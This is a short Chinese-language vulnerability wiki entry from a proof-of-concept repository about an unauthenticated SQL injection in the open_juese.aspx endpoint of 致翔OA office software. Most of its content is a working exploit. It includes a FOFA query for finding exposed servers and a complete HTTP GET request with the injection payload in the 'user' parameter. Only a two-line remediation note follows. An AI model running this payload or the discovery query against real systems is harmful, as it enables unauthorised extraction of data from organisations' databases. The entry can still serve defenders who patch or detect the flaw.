---

source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 致翔软件致翔OA-open_juese存在SQL注入漏洞

# 漏洞描述

致翔OA-open_juese存在SQL注入漏洞，在未经身份验证的情况下可进行数据库的数据读取，危害很大。

# 影响版本

致翔OA

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="致翔软件-致翔OA"

POC/EXP：

GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr=  HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20241101205125398](./.resource/致翔软件致翔OA-open_juese存在SQL注入漏洞/media/image-20241101205125398.png)


![image-20241101205413270](./.resource/致翔软件致翔OA-open_juese存在SQL注入漏洞/media/image-20241101205413270.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
